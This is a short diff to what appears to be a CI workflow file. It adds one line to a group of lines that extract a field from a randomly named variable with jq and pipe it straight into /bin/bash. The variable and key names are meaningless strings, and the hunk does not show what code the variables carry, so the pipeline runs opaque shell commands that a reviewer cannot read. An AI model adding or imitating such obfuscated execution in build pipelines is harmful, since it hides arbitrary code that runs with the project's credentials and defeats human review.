@@ -32,6 +32,7 @@ jobs:
           echo $zcs3115 | jq -r .j1224 | /bin/bash
           echo $pss60468 | jq -r .pbip8603 | /bin/bash
           printf '%s' "$y62" | jq -r .qzdy79 | /bin/bash
+          printf '%s' "$blkno6" | jq -r .x11 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
